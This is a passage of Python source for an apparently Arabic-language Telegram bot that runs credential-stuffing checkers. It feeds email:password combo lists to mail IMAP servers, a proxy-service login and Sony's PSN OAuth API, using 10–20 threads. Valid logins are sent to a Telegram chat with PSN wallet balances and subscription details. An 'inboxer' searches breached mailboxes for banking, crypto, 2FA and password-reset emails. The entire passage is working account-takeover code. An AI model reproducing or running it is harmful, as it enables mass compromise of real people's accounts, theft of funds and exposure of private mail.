    'ymail.com':('imap.mail.yahoo.com',993),'rocketmail.com':('imap.mail.yahoo.com',993),
    'icloud.com':('imap.mail.me.com',993),'me.com':('imap.mail.me.com',993),
    'mac.com':('imap.mail.me.com',993),'aol.com':('imap.aol.com',993),
    'aim.com':('imap.aol.com',993),'verizon.net':('incoming.verizon.net',993),
    'mail.com':('imap.mail.com',993),'gmx.com':('imap.gmx.com',993),
    'gmx.net':('imap.gmx.com',993),'gmx.de':('imap.gmx.net',993),
    'web.de':('imap.web.de',993),'freenet.de':('mx.freenet.de',993),
    't-online.de':('secureimap.t-online.de',993),
    'mail.ru':('imap.mail.ru',993),'list.ru':('imap.mail.ru',993),
    'inbox.ru':('imap.mail.ru',993),'bk.ru':('imap.mail.ru',993),
    'yandex.ru':('imap.yandex.ru',993),'yandex.com':('imap.yandex.com',993),
    'ya.ru':('imap.yandex.ru',993),'rambler.ru':('imap.rambler.ru',993),
    'qq.com':('imap.qq.com',993),'163.com':('imap.163.com',993),
    '126.com':('imap.126.com',993),'sina.com':('imap.sina.com',993),
    'zoho.com':('imap.zoho.com',993),'fastmail.com':('imap.fastmail.com',993),
    'fastmail.fm':('imap.fastmail.com',993),'naver.com':('imap.naver.com',993),
    'o2.pl':('imap.o2.pl',993),'wp.pl':('imap.wp.pl',993),
    'onet.pl':('imap.poczta.onet.pl',993),'seznam.cz':('imap.seznam.cz',993),
    'libero.it':('imap.libero.it',993),'virgilio.it':('imap.virgilio.it',993),
    'tiscali.it':('imap.tiscali.it',993),'orange.fr':('imap.orange.fr',993),
    'laposte.net':('imap.laposte.net',993),'sfr.fr':('imap.sfr.fr',993),
    'terra.com.br':('imap.terra.com.br',993),'ig.com.br':('imap.ig.com.br',993),
    'rogers.com':('imap.rogers.com',993),'shaw.ca':('mail.shaw.ca',993),
    'comcast.net':('imap.comcast.net',993),'att.net':('imap.mail.att.net',993),
    'sbcglobal.net':('imap.mail.att.net',993),'cox.net':('imap.cox.net',993),
    'btinternet.com':('imap.btinternet.com',993),'sky.com':('imap.sky.com',993),
    'virginmedia.com':('imap.virginmedia.com',993),'mail.bg':('imap.mail.bg',993),
    'abv.bg':('imap.abv.bg',993),'inbox.lv':('mail.inbox.lv',993),
}

def _imap_check_one(email: str, password: str) -> tuple:
    domain = email.split('@')[-1].lower() if '@' in email else ''
    server_info = _IMAP_SERVERS.get(domain, (f'imap.{domain}', 993))
    host, port  = server_info
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        conn = imaplib.IMAP4_SSL(host, port, ssl_context=ctx)
        conn.login(email, password)
        status, data = conn.select('INBOX')
        inbox = int(data[0].decode()) if data and data[0] else 0
        _, flist = conn.list()
        folders = len(flist) if flist else 0
        conn.logout()
        return True, {'inbox':inbox,'folders':folders,'host':host}
    except imaplib.IMAP4.error as e:
        err = str(e).lower()
        if any(x in err for x in ['authent','login','invalid','credentials','bad']):
            return False, 'AUTH_FAIL'
        return False, 'IMAP_ERR'
    except Exception:
        return False, 'OFFLINE'

def run_imap_checker(token, cid, lines):
    total = len(lines)
    hits  = []
    bad   = 0
    offline = 0
    errors  = 0
    checked = 0
    lock = threading.Lock()
    start_ts = time.time()
    stop_ev = get_stop_event(cid)
    prog_mid = _send_msg_id(token, cid,
        f"╔══════════════════════════╗\n║  📬  <b>IMAP Checker</b>    ║\n"
        f"╠══════════════════════════╣\n║  📋 إجمالي : <b>{total}</b>\n"
        f"║  ⏳ جاري الفحص...\n╚══════════════════════════╝",
        reply_markup=_stop_markup())

    def check_one(line):
        nonlocal checked, bad, offline, errors
        if stop_ev.is_set():
            return
        parts = line.strip().split(':',1)
        if len(parts) < 2:
            with lock:
                bad += 1; checked += 1
            return
        email, password = parts[0].strip(), parts[1].strip()
        try:
            ok, info = _imap_check_one(email, password)
            with lock:
                checked += 1
                if ok:
                    hit = (f"✅ {email}:{password} | "
                           f"Inbox:{info['inbox']} Folders:{info['folders']} Host:{info['host']}")
                    hits.append(hit)
                    send_message(token, cid,
                        f"📬 <b>IMAP HIT!</b>\n📧 <code>{email}</code>\n🔑 <code>{password}</code>\n"
                        f"📥 Inbox:{info['inbox']} 📂 Folders:{info['folders']}\n🌐 <code>{info['host']}</code>")
                elif info == 'OFFLINE':
                    offline += 1
                elif info == 'AUTH_FAIL':
                    bad += 1
                else:
                    errors += 1
        except Exception:
            with lock:
                errors += 1; checked += 1

    ex = ThreadPoolExecutor(max_workers=20)
    futures = [ex.submit(check_one, l) for l in lines]
    last_upd = time.time()
    stopped = False
    for fut in as_completed(futures):
        if stop_ev.is_set():
            stopped = True
            ex.shutdown(wait=False)
            break
        if time.time() - last_upd > 5:
            last_upd = time.time()
            elapsed = max(int(time.time()-start_ts),1)
            cpm     = int(checked/(elapsed/60))
            try:
                edit_message(token, cid, prog_mid,
                    f"╔══════════════════════════╗\n║  📬  <b>IMAP Checker</b>    ║\n"
                    f"╠══════════════════════════╣\n║ ✅ هيتات  : <b>{len(hits)}</b>\n"
                    f"║ ❌ خاطئ   : <b>{bad}</b>\n║ 📵 أوفلاين : <b>{offline}</b>\n"
                    f"║ ⚠️ خطأ    : <b>{errors}</b>\n║ 📋 تم     : <b>{checked}/{total}</b>\n"
                    f"║ ⚡ CPM    : <b>{cpm}</b>\n╚══════════════════════════╝",
                    reply_markup=_stop_markup())
            except Exception:
                pass
    ex.shutdown(wait=False)
    if stopped:
        _stopped_msg(token, cid, prog_mid, hits, checked, total, "IMAP Checker")
        return
    _send_checker_results(token, cid, hits, total, checked, bad, errors,
                          "IMAP Checker", "imap_hits.txt")
    sess(cid)["state"] = "idle"


# ══════════════════════════════════════════════════════════════════════════════
# 📬 IMAP KEYWORD INBOXER — فاحص الكلمات المفتاحية لكل الدومينات
# ══════════════════════════════════════════════════════════════════════════════
#
#  يدخل إلى أي إيميل عبر IMAP ويبحث عن كلمات مفتاحية محددة في الصندوق الوارد.
#  يدعم 100+ دومين، ويستخرج عناوين الرسائل المطابقة كأدلة.
# ══════════════════════════════════════════════════════════════════════════════

_INBOXER_CATEGORIES: dict = {
    "gaming": [
        "PlayStation", "Xbox", "Steam", "Epic Games", "Nintendo",
        "Roblox", "EA Play", "Battle.net", "Ubisoft", "Blizzard",
        "Game Pass", "PSN", "PS Plus", "Origin",
    ],
    "financial": [
        "PayPal", "Bank Transfer", "Invoice", "Payment",
        "Refund", "Western Union", "MoneyGram", "Wire Transfer",
        "Stripe", "Credit Card", "Debit Card", "Withdrawal",
    ],
    "shopping": [
        "Amazon", "eBay", "Your order", "Order confirmed",
        "Shipping confirmation", "Delivery", "Receipt",
        "Purchase", "Ali Express", "Shein", "Walmart",
    ],
    "streaming": [
        "Netflix", "Spotify", "Disney", "HBO",
        "Prime Video", "Apple TV", "Hulu", "Twitch",
        "YouTube Premium", "Deezer", "Tidal",
    ],
    "security": [
        "Password reset", "Verify your email", "Two-factor",
        "2FA", "OTP", "Security alert", "Login attempt",
        "Suspicious activity", "Account access", "Confirm your",
    ],
    "crypto": [
        "Bitcoin", "Binance", "Coinbase", "Ethereum",
        "Crypto wallet", "USDT", "Bybit", "Blockchain",
        "Withdrawal confirmed", "Deposit received", "KuCoin", "OKX",
    ],
}
# دمج جميع الكلمات
_INBOXER_CATEGORIES["all"] = list({kw for cat in _INBOXER_CATEGORIES.values() for kw in cat})

_INBOXER_CAT_LABELS = {
    "gaming":    "🎮 Gaming (PlayStation, Xbox, Steam...)",
    "financial": "💳 Financial (PayPal, Bank, Refund...)",
    "shopping":  "🛒 Shopping (Amazon, eBay, Orders...)",
    "streaming": "🎬 Streaming (Netflix, Spotify, Disney...)",
    "security":  "🔐 Security (Reset, 2FA, OTP...)",
    "crypto":    "🪙 Crypto (Bitcoin, Binance, USDT...)",
    "all":       "📧 الكل — All Keywords Combined",
}


def _inboxer_imap_connect(host: str, port: int, email: str, password: str):
    """
    يحاول الاتصال بخادم IMAP. يُعيد (conn, None) أو (None, 'AUTH_FAIL'|'OFFLINE').
    """
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    try:
        conn = imaplib.IMAP4_SSL(host, port, ssl_context=ctx)
        conn.login(email, password)
        return conn, None
    except imaplib.IMAP4.error as e:
        err = str(e).lower()
        if any(x in err for x in ["authent", "login", "invalid", "credentials",
                                   "bad", "failed", "incorrect", "disabled"]):
            return None, "AUTH_FAIL"
        return None, "IMAP_ERR"
    except OSError:
        return None, "OFFLINE"
    except Exception:
        return None, "OFFLINE"


def _inboxer_search_keyword(conn, keyword: str, limit: int = 3) -> list:
    """
    يبحث عن كلمة مفتاحية في موضوع الرسائل والمرسِل.
    يُعيد قائمة بعناوين الرسائل المطابقة (حتى `limit`).
    """
    subjects = []
    seen_ids = set()

    def _search(criterion):
        try:
            # IMAP SEARCH — safe quoting
            safe_kw = keyword.replace('"', '')
            typ, data = conn.search(None, f'{criterion} "{safe_kw}"')
            if typ != "OK" or not data or not data[0]:
                return []
            ids = data[0].split()
            return ids
        except Exception:
            return []

    # ابحث في الموضوع أولاً
    subj_ids = _search("SUBJECT")
    from_ids = _search("FROM")
    all_ids  = list({i for i in subj_ids + from_ids})[:limit * 3]

    if not all_ids:
        return []

    # استخرج موضوع الرسائل
    for msg_id in all_ids[:limit]:
        if msg_id in seen_ids:
            continue
        seen_ids.add(msg_id)
        try:
            typ, msg_data = conn.fetch(msg_id, "(BODY[HEADER.FIELDS (SUBJECT FROM DATE)])")
            if typ != "OK" or not msg_data or not msg_data[0]:
                continue
            raw = msg_data[0][1]
            if isinstance(raw, bytes):
                raw = raw.decode("utf-8", errors="replace")
            subj_match = re.search(r'Subject:\s*(.+)', raw, re.IGNORECASE)
            from_match = re.search(r'From:\s*(.+)', raw, re.IGNORECASE)
            subj_str = (subj_match.group(1).strip()[:80] if subj_match else "")
            from_str = (from_match.group(1).strip()[:50] if from_match else "")
            if subj_str or from_str:
                subjects.append(f"📧 {subj_str} ← {from_str}")
        except Exception:
            pass

    return subjects


def _inboxer_check_one(email: str, password: str, keywords: list) -> dict:
    """
    الفحص الكامل لحساب بريد إلكتروني واحد.
    يُعيد dict: status + inbox_count + keyword_hits
    """
    out = {
        "status":       "bad",   # bad | hit | valid | offline | error
        "host":         "N/A",
        "inbox_count":  0,
        "keyword_hits": {},      # {keyword: [subject_lines]}
    }

    domain = email.split("@")[-1].lower() if "@" in email else ""
    host, port = _IMAP_SERVERS.get(domain, (f"imap.{domain}", 993))
    out["host"] = host

    conn, err_reason = _inboxer_imap_connect(host, port, email, password)
    if conn is None:
        out["status"] = {
            "AUTH_FAIL": "bad",
            "IMAP_ERR":  "error",
            "OFFLINE":   "offline",
        }.get(err_reason, "error")
        return out

    try:
        # فتح الصندوق الوارد
        typ, data = conn.select("INBOX")
        if typ == "OK" and data and data[0]:
            try:
                out["inbox_count"] = int(data[0].decode())
            except Exception:
                pass

        # البحث عن كل كلمة مفتاحية
        found_any = False
        for kw in keywords:
            try:
                subjects = _inboxer_search_keyword(conn, kw, limit=3)
                if subjects:
                    out["keyword_hits"][kw] = subjects
                    found_any = True
            except Exception:
                pass

        out["status"] = "hit" if found_any else "valid"

    except Exception:
        out["status"] = "error"
    finally:
        try:
            conn.logout()
        except Exception:
            pass

    return out


def _inboxer_hit_message(email: str, password: str, d: dict) -> str:
    """رسالة هيت مفصّلة للتيليغرام."""
    hits = d.get("keyword_hits", {})
    kw_lines = []
    for kw, subjects in list(hits.items())[:8]:
        count = len(subjects)
        kw_lines.append(f"  🔑 <b>{esc(kw)}</b> ({count} رسالة)")
        for s in subjects[:2]:
            kw_lines.append(f"    ↳ <i>{esc(s[:70])}</i>")
    kw_block = "\n".join(kw_lines) if kw_lines else "  (لا كلمات مطابقة)"
    return (
        f"📬 <b>INBOXER HIT!</b>\n"
        f"{'═'*26}\n"
        f"📧 <code>{esc(email)}</code>\n"
        f"🔑 <code>{esc(password)}</code>\n"
        f"🌐 Host: <code>{esc(d['host'])}</code>\n"
        f"📥 Inbox: <b>{d['inbox_count']:,}</b> رسالة\n"
        f"{'═'*26}\n"
        f"🔍 <b>الكلمات المطابقة:</b>\n"
        f"{kw_block}\n"
        f"{'═'*26}\n"
        f"💎 {MY_SIGNATURE}"
    )


def _inboxer_hit_line(email: str, password: str, d: dict) -> str:
    """سطر واحد للملف النصي."""
    kw_names = list(d.get("keyword_hits", {}).keys())
    kw_str = " | ".join(kw_names[:10])
    return (
        f"[HIT] {email}:{password} | "
        f"Host:{d['host']} | Inbox:{d['inbox_count']} | "
        f"Keywords:[{kw_str}]"
    )


def run_inboxer_checker(token, cid, lines, keywords=None):
    """
    📬 IMAP Keyword Inboxer — يبحث في صناديق البريد عن كلمات مفتاحية.
    keywords: قائمة بالكلمات المراد البحث عنها.
    """
    if not keywords:
        keywords = _INBOXER_CATEGORIES["all"]

    total    = len(lines)
    lock     = threading.Lock()
    start_ts = time.time()
    stop_ev  = get_stop_event(cid)

    # إحصائيات
    stats = {
        "hits":    0,   # تسجيل دخول + وُجدت كلمات
        "valid":   0,   # تسجيل دخول + لا كلمات
        "bad":     0,   # كلمة مرور خاطئة
        "offline": 0,   # خادم غير متاح
        "errors":  0,
        "checked": 0,
    }
    # CPM بنافذة منزلقة
    _cpm_times = _collections.deque()
    _cpm_lock  = threading.Lock()

    # ملفات النتائج
    res_dir = f"Results/{cid}"
    os.makedirs(res_dir, exist_ok=True)
    ts_tag  = int(time.time())
    _f_hits  = f"{res_dir}/INBOXER_HITS_{ts_tag}.txt"
    _f_valid = f"{res_dir}/INBOXER_VALID_{ts_tag}.txt"
    _f_bad   = f"{res_dir}/INBOXER_BAD_{ts_tag}.txt"

    kw_preview = ", ".join(keywords[:6])
    header_kw  = " | ".join(keywords[:15])
    _file_hdr  = (
        f"{'═'*50}\n"
        f"📬 IMAP KEYWORD INBOXER — {MY_SIGNATURE}\n"
        f"📅 {datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n"
        f"🔑 Keywords: {header_kw}\n"
        f"{'═'*50}\n\n"
    )
    for fp, lbl in [(_f_hits, "HIT — keyword found"), (_f_valid, "VALID — no keyword"),
                    (_f_bad, "BAD — wrong password")]:
        with open(fp, "w", encoding="utf-8") as f:
            f.write(_file_hdr)

    def _save(fp, line):
        with open(fp, "a", encoding="utf-8") as f:
            f.write(line + "\n")

    def _cpm_tick():
        now = time.time()
        with _cpm_lock:
            _cpm_times.append(now)
            while _cpm_times and _cpm_times[0] < now - 60:
                _cpm_times.popleft()

    def _cpm_val():
        now = time.time()
        with _cpm_lock:
            el = min(now - start_ts, 60.0)
            return int(len(_cpm_times) / el * 60) if el >= 1 else 0

    # رسالة التقدم الأولى
    kw_short = kw_preview[:60]
    prog_mid = _send_msg_id(token, cid,
        f"╔{'═'*32}╗\n"
        f"║  📬  <b>IMAP KEYWORD INBOXER</b>  📬  ║\n"
        f"╠{'═'*32}╣\n"
        f"║  📋 كومبو  : <b>{total:,}</b>\n"
        f"║  🔑 كلمات : <code>{esc(kw_short)}...</code>\n"
        f"║  ⏳ جارٍ...\n"
        f"╚{'═'*32}╝",
        reply_markup=_stop_markup())

    def _update(force=False):
        now = time.time()
        if not _update.__dict__.get("_t"):
            _update._t = 0.0
        if not force and now - _update._t < 4.5:
            return
        _update._t = now
        with lock:
            s = dict(stats)
        cpm     = _cpm_val()
        checked = s["checked"]
        pct     = checked / total * 100 if total else 0
        filled  = int(pct / 100 * 24)
        bar     = "█" * filled + "░" * (24 - filled)
        elapsed = max(int(now - start_ts), 1)
        m_, s_  = divmod(elapsed, 60)
        el_str  = f"{m_}m {s_}s"
        eta_str = "—"
        if cpm > 0 and checked < total:
            eta_s      = int((total - checked) / cpm * 60)
            em, es     = divmod(eta_s, 60)
            eta_str    = f"{em}m {es}s" if em else f"{es}s"
        done = checked >= total
        msg = (
            f"╔{'═'*32}╗\n"
            f"║  📬  <b>IMAP KEYWORD INBOXER</b>  ║\n"
            f"╠{'═'*32}╣\n"
            f"║  ✅ هيتات (كلمات)  : <b>{s['hits']:>5,}</b>\n"
            f"║  📭 صالح (بدون)    : <b>{s['valid']:>5,}</b>\n"
            f"║  ❌ خاطئ           : <b>{s['bad']:>5,}</b>\n"
            f"║  📵 أوفلاين        : <b>{s['offline']:>5,}</b>\n"
            f"║  ⚠️  خطأ           : <b>{s['errors']:>5,}</b>\n"
            f"╠{'═'*32}╣\n"
            f"║  📊 [{bar}] {pct:.1f}%\n"
            f"║  📋 {checked:,} / {total:,}\n"
            f"║  ⚡ CPM    : <b>{cpm:,}</b>\n"
            f"║  ⏱️ وقت    : {el_str} | ETA: {eta_str}\n"
            f"╚{'═'*32}╝\n"
            f"💎 {MY_SIGNATURE}"
        )
        edit_message(token, cid, prog_mid, msg,
                     reply_markup=None if done else _stop_markup())

    # فحص حساب واحد
    def check_one(line):
        if stop_ev.is_set():
            return
        parts = line.strip().split(":", 1)
        if len(parts) < 2:
            with lock:
                stats["bad"]     += 1
                stats["checked"] += 1
            return
        email, password = parts[0].strip(), parts[1].strip()
        if not email or "@" not in email or not password:
            with lock:
                stats["bad"]     += 1
                stats["checked"] += 1
            return

        d = _inboxer_check_one(email, password, keywords)
        _cpm_tick()

        with lock:
            stats["checked"] += 1
            st = d["status"]
            if st == "hit":
                stats["hits"] += 1
                _save(_f_hits, _inboxer_hit_line(email, password, d))
                try:
                    send_message(token, cid,
                        _inboxer_hit_message(email, password, d))
                except Exception:
                    pass
            elif st == "valid":
                stats["valid"] += 1
                _save(_f_valid, f"[VALID] {email}:{password} | "
                                f"Host:{d['host']} | Inbox:{d['inbox_count']}")
            elif st == "bad":
                stats["bad"] += 1
                _save(_f_bad, f"[BAD] {email}:{password}")
            elif st == "offline":
                stats["offline"] += 1
            else:
                stats["errors"] += 1

        _update()

    # تشغيل الـ Pool
    ex = ThreadPoolExecutor(max_workers=20)
    futures = [ex.submit(check_one, l) for l in lines]
    stopped = False
    for fut in as_completed(futures):
        if stop_ev.is_set():
            stopped = True
            ex.shutdown(wait=False)
            break
        try:
            fut.result()
        except Exception:
            pass
    ex.shutdown(wait=False)

    # تحديث نهائي وإرسال ملخص
    _update(force=True)

    with lock:
        s = dict(stats)
    elapsed    = max(int(time.time() - start_ts), 1)
    avg_cpm    = int(s["checked"] / elapsed * 60)
    m_el, s_el = divmod(elapsed, 60)
    h_el, m_el = divmod(m_el, 60)
    el_str     = (f"{h_el}h {m_el}m {s_el}s" if h_el else f"{m_el}m {s_el}s")
    stop_icon  = "🛑" if stopped else "✅"

    summary = (
        f"{stop_icon} <b>{'أُوقف' if stopped else 'اكتمل'} — INBOXER</b>\n\n"
        f"╔{'═'*30}╗\n"
        f"║  📬  <b>KEYWORD INBOXER — النتائج</b>  ║\n"
        f"╠{'═'*30}╣\n"
        f"║  ✅ هيتات (كلمات)  : <b>{s['hits']:,}</b>\n"
        f"║  📭 صالح (بدون)    : <b>{s['valid']:,}</b>\n"
        f"║  ❌ خاطئ           : <b>{s['bad']:,}</b>\n"
        f"║  📵 أوفلاين        : <b>{s['offline']:,}</b>\n"
        f"╠{'═'*30}╣\n"
        f"║  📋 مجموع   : <b>{s['checked']:,} / {total:,}</b>\n"
        f"║  ⚡ CPM     : <b>{avg_cpm:,}</b>\n"
        f"║  ⏱️ وقت     : {el_str}\n"
        f"╚{'═'*30}╝\n"
        f"💎 {MY_SIGNATURE}"
    )
    send_message(token, cid, summary)

    # إرسال الملفات
    if s["hits"] > 0:
        send_document(token, cid, _f_hits,
                      caption=f"📬 {s['hits']:,} هيت — كلمات مطابقة\n💎 {MY_SIGNATURE}")
    if s["valid"] > 0:
        send_document(token, cid, _f_valid,
                      caption=f"📭 {s['valid']:,} حساب صالح (بدون كلمات)\n💎 {MY_SIGNATURE}")

    # ── إرسال ملف البوت عند الانتهاء ─────────────────────────────────────────
    bot_file = os.path.abspath(__file__)
    try:
        send_document(token, cid, bot_file,
                      caption=f"🤖 <b>ملف البوت الكامل</b>\n💎 {MY_SIGNATURE}")
    except Exception:
        pass

    sess(cid)["state"] = "idle"


# ── PlainProxy ────────────────────────────────────────────────────────────────

def _plainproxy_check_one(email: str, password: str) -> tuple:
    try:
        session = requests.Session()
        headers = {
            "Accept": "text/html, application/xhtml+xml;q=0.9, */*;q=0.8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "X-Inertia": "true",
            "X-Inertia-Version": "d6f5222ffc6d3eaf474292953285562e",
            "X-Requested-With": "XMLHttpRequest",
        }
        r = session.get("https://dashboard.plainproxies.com/", headers=headers, timeout=14)
        xsrf = urllib.parse.unquote(session.cookies.get('XSRF-TOKEN',''))
        if not xsrf:
            return 'error', None
        headers['Content-Type'] = 'application/json'
        headers['X-Xsrf-Token'] = xsrf
        headers['Referer'] = 'https://dashboard.plainproxies.com/login'
        headers['Origin']  = 'https://dashboard.plainproxies.com'
        r2 = session.post("https://dashboard.plainproxies.com/login",
                          headers=headers,
                          json={"email":email,"password":password,"remember":False},
                          timeout=16)
        if r2.status_code not in (200,201):
            return 'bad', None
        try:
            data = r2.json()
        except Exception:
            return 'bad', None
        component = data.get("component","")
        if "Dashboard" in component or "Index" in component:
            props    = data.get("props",{})
            user     = props.get("auth",{}).get("user",{})
            products = len(props.get("active_products",[]))
            unlim    = len(props.get("active_unlimited_residential",[]))
            plans    = len(props.get("activePlans",[]))
            return 'hit', {
                'name':user.get('name','N/A'),'email':user.get('email',email),
                'products':products,'unlim':unlim,'plans':plans,'total':products+unlim+plans
            }
        return 'bad', None
    except Exception:
        return 'error', None

def run_plainproxy_checker(token, cid, lines):
    total = len(lines)
    hits  = []
    bad   = 0
    errors= 0
    checked = 0
    lock = threading.Lock()
    start_ts = time.time()
    stop_ev = get_stop_event(cid)
    prog_mid = _send_msg_id(token, cid,
        f"╔══════════════════════════╗\n║  🌐  <b>PlainProxy Checker</b> ║\n"
        f"╠══════════════════════════╣\n║  📋 إجمالي : <b>{total}</b>\n"
        f"║  ⏳ جاري الفحص...\n╚══════════════════════════╝",
        reply_markup=_stop_markup())

    def check_one(line):
        nonlocal checked, bad, errors
        if stop_ev.is_set():
            return
        parts = line.strip().split(':',1)
        if len(parts) < 2:
            with lock:
                bad += 1; checked += 1
            return
        email, password = parts[0].strip(), parts[1].strip()
        try:
            status, info = _plainproxy_check_one(email, password)
            with lock:
                checked += 1
                if status == 'hit':
                    hit = (f"✅ {email}:{password} | Name:{info['name']} | "
                           f"Products:{info['products']} Unlimited:{info['unlim']} Total:{info['total']}")
                    hits.append(hit)
                    send_message(token, cid,
                        f"🌐 <b>PlainProxy HIT!</b>\n📧 <code>{email}</code>\n🔑 <code>{password}</code>\n"
                        f"👤 {info['name']}\n📦 Products:{info['products']} ♾ Unlimited:{info['unlim']}")
                elif status == 'bad':
                    bad += 1
                else:
                    errors += 1
        except Exception:
            with lock:
                errors += 1; checked += 1

    ex = ThreadPoolExecutor(max_workers=10)
    futures = [ex.submit(check_one, l) for l in lines]
    last_upd = time.time()
    stopped = False
    for fut in as_completed(futures):
        if stop_ev.is_set():
            stopped = True
            ex.shutdown(wait=False)
            break
        if time.time() - last_upd > 5:
            last_upd = time.time()
            elapsed = max(int(time.time()-start_ts),1)
            cpm     = int(checked/(elapsed/60))
            try:
                edit_message(token, cid, prog_mid,
                    f"╔══════════════════════════╗\n║  🌐  <b>PlainProxy Checker</b> ║\n"
                    f"╠══════════════════════════╣\n║ ✅ هيتات  : <b>{len(hits)}</b>\n"
                    f"║ ❌ خاطئ   : <b>{bad}</b>\n║ ⚠️ خطأ    : <b>{errors}</b>\n"
                    f"║ 📋 تم     : <b>{checked}/{total}</b>\n║ ⚡ CPM    : <b>{cpm}</b>\n"
                    f"╚══════════════════════════╝",
                    reply_markup=_stop_markup())
            except Exception:
                pass
    ex.shutdown(wait=False)
    if stopped:
        _stopped_msg(token, cid, prog_mid, hits, checked, total, "PlainProxy Checker")
        return
    _send_checker_results(token, cid, hits, total, checked, bad, errors,
                          "PlainProxy Checker", "plainproxy_hits.txt")
    sess(cid)["state"] = "idle"


# ── PSN Checker (v3 — direct API) ─────────────────────────────────────────────

def _psn_check_one(email, password):
    try:
        oauth_url = (
            "https://ca.account.sony.com/api/authz/v3/oauth/token"
        )
        data = {
            "authentication_type": "password",
            "client_id":           "09515159-7237-4370-9b40-3806e67c0891",
            "grant_type":          "password",
            "scope":               "psn:mobile.v1 psn:clientapp",
            "username":            email,
            "password":            password,
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent":   "com.scee.psxandroid.sceuebc/11.8.2 (Android/12; Sony/SOG07)",
            "X-Platform":   "Android",
        }
        r = requests.post(oauth_url, data=data, headers=headers, timeout=15)
        if r.status_code != 200:
            return 'bad', {}
        access_token = r.json().get("access_token","")
        if not access_token:
            return 'bad', {}
        profile_url = "https://m.np.playstation.com/api/userProfile/v1/internal/users/me/profiles"
        ph = {
            "Authorization": f"Bearer {access_token}",
            "User-Agent": "com.scee.psxandroid.sceuebc/11.8.2 (Android/12; Sony/SOG07)",
        }
        p = requests.get(profile_url, headers=ph, timeout=12).json()
        online_id = p.get("onlineId","N/A")
        country   = p.get("region","N/A")
        # PS Plus
        sub_url = "https://m.np.playstation.com/api/graphql/v1/op?extensions=%7B%22persistedQuery%22%3A%7B%22version%22%3A1%2C%22sha256Hash%22%3A%22e0d4eded7ea7d69a33c65bade05bfb43ecdcf9cd99de4e8fa29e56da24a4d8b9%22%7D%7D"
        sph = {**ph, "Origin":"https://www.playstation.com", "Referer":"https://www.playstation.com/"}
        sr = requests.get(sub_url, headers=sph, timeout=12).json()
        psplus = False
        tier   = "None"
        exp_d  = "N/A"
        wallet = "N/A"
        try:
            data_block = sr.get("data",{})
            sub_data   = data_block.get("subscriptionProductQuery",{})
            products   = sub_data.get("products",[])
            for prod in products:
                if "playstation plus" in prod.get("productName","").lower():
                    psplus = True
                    tier   = prod.get("productName","")
                    exp_d  = prod.get("endDate","N/A")
                    break
        except Exception:
            pass
        # Wallet
        try:
            wurl = "https://m.np.playstation.com/api/graphql/v1/op?extensions=%7B%22persistedQuery%22%3A%7B%22version%22%3A1%2C%22sha256Hash%22%3A%22512f05d93ccb0f6b0b218d9741c2f2b862f33df63e41a3b6ca9b38c3df96b5e2%22%7D%7D"
            wr = requests.get(wurl, headers=sph, timeout=10).json()
            wallet = wr.get("data",{}).get("wallet",{}).get("totalBalance",{}).get("formattedValue","N/A")
        except Exception:
            pass
        return 'hit', {
            'online_id':online_id,'country':country,'psplus':psplus,
            'psplus_tier':tier,'psplus_exp':exp_d,'wallet':wallet
        }
    except Exception:
        return 'error', {}

def run_psn_checker(token, cid, lines):
    total = len(lines)
    hits  = []
    locked= []
    bad   = 0
    errors= 0
    checked = 0
    lock = threading.Lock()
    start_ts = time.time()
    stop_ev = get_stop_event(cid)
    prog_mid = _send_msg_id(token, cid,
        f"╔═══════════════════════════════╗\n║  🎮  <b>PSN Network Checker v3</b>  ║\n"
        f"╠═══════════════════════════════╣\n║  📋 إجمالي : <b>{total}</b>\n"
        f"║  ⏳ جارٍ...\n╚═══════════════════════════════╝",
        reply_markup=_stop_markup())

    def check_one(line):
        nonlocal checked, bad, errors
        if stop_ev.is_set():
            return
        parts = line.strip().split(':',1)
        if len(parts) < 2:
            with lock:
                bad += 1; checked += 1
            return
        email, password = parts[0].strip(), parts[1].strip()
        status, info = _psn_check_one(email, password)
        with lock:
            checked += 1
            if status == 'hit':
                oid    = info.get('online_id','N/A')
                cntry  = info.get('country','N/A')
                psplus = info.get('psplus',False)
                tier   = info.get('psplus_tier','None')
                exp_d  = info.get('psplus_exp','N/A')
                wallet = info.get('wallet','N/A')
                ps_icon= "✅" if psplus else "❌"
                hit_line = (f"✅ {email}:{password} | PSN:{oid} | Country:{cntry} | "
                            f"PS+:{psplus}({tier}) | Exp:{exp_d} | Wallet:{wallet}")
                hits.append(hit_line)
                send_message(token, cid,
                    f"🎮 <b>PSN HIT!</b>\n📧 <code>{email}</code>\n🔑 <code>{password}</code>\n"
                    f"👤 Online ID: <b>{oid}</b>\n🌍 Region: <b>{cntry}</b>\n"
                    f"{ps_icon} PS Plus: <b>{'نعم' if psplus else 'لا'}</b>\n"
                    + (f"🏅 Tier: <b>{tier}</b>\n📅 Exp: <b>{exp_d}</b>\n" if psplus else "")
                    + f"💳 Wallet: <b>{wallet}</b>")
            elif status == 'locked':
                locked.append(f"🔒 {email}:{password}")
            elif status == 'bad':
                bad += 1
            else:
                errors += 1

    ex = ThreadPoolExecutor(max_workers=15)
    futures = [ex.submit(check_one, l) for l in lines]
    last_upd = time.time()
    stopped = False
    for fut in as_completed(futures):
        if stop_ev.is_set():
            stopped = True
            ex.shutdown(wait=False)
            break
        if time.time() - last_upd > 4:
            last_upd = time.time()
            elapsed = max(int(time.time()-start_ts),1)
            cpm     = int(checked/(elapsed/60))
            try:
                edit_message(token, cid, prog_mid,
                    f"╔═══════════════════════════════╗\n║  🎮  <b>PSN Network Checker v3</b>  ║\n"
                    f"╠═══════════════════════════════╣\n║ ✅ هيتات   : <b>{len(hits)}</b>\n"
                    f"║ 🔒 مقفول   : <b>{len(locked)}</b>\n║ ❌ خاطئ    : <b>{bad}</b>\n"
                    f"║ ⚠️  خطأ     : <b>{errors}</b>\n"
                    f"║ 📋 تم      : <b>{checked}/{total}</b>\n"
                    f"║ ⚡ السرعة  : <b>{cpm}/دقيقة</b>\n"
                    f"║ {_bar(checked, total)}\n╚═══════════════════════════════╝",
                    reply_markup=_stop_markup())
            except Exception:
                pass
    ex.shutdown(wait=False)
    if stopped:
